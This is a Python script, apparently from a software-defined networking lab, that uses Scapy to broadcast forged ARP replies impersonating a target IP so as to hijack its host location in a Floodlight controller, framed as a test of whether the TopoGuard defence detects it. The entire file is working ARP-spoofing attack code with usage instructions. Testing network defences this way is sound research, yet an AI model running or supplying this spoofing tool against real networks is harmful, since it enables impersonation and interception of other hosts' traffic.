#!/usr/bin/env python3
"""
Host Location Hijacking Attack
This simulates an attacker trying to trick the controller about host locations
TopoGuard should detect and block this attack
"""

from scapy.all import *
import time
import sys

def host_location_hijack(target_ip, fake_mac, interface='h1-eth0', count=100):
    """
    Send fake ARP packets to confuse the controller about host location
    
    Args:
        target_ip: IP address to impersonate
        fake_mac: MAC address to use
        interface: Network interface to send from
        count: Number of packets to send
    """
    print(f"[*] Starting Host Location Hijacking Attack")
    print(f"[*] Target IP: {target_ip}")
    print(f"[*] Fake MAC: {fake_mac}")
    print(f"[*] Interface: {interface}")
    print(f"[*] Packets: {count}")
    print("[*] TopoGuard should detect and block this attack...")
    
    # Create fake ARP reply
    for i in range(count):
        # ARP packet claiming to be the target
        arp_pkt = ARP(
            op=2,  # ARP reply
            psrc=target_ip,
            hwsrc=fake_mac,
            pdst="10.0.0.1",  # Broadcast to controller
            hwdst="ff:ff:ff:ff:ff:ff"
        )
        
        # Encapsulate in Ethernet frame
        eth_pkt = Ether(dst="ff:ff:ff:ff:ff:ff", src=fake_mac) / arp_pkt
        
        # Send packet
        sendp(eth_pkt, iface=interface, verbose=False)
        
        if (i+1) % 10 == 0:
            print(f"[+] Sent {i+1} fake ARP packets")
        
        time.sleep(0.1)
    
    print("[!] Attack completed")
    print("[?] Check Floodlight logs for TopoGuard detection")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 host_location_hijack.py <target_ip> <fake_mac>")
        print("Example: python3 host_location_hijack.py 10.0.0.2 00:00:00:00:00:99")
        sys.exit(1)
    
    target = sys.argv[1]
    fake_mac = sys.argv[2]
    
    try:
        host_location_hijack(target, fake_mac)
    except PermissionError:
        print("[!] Error: This script requires root/administrator privileges")
        print("[!] Run with: sudo python3 host_location_hijack.py ...")
    except Exception as e:
        print(f"[!] Error: {e}")
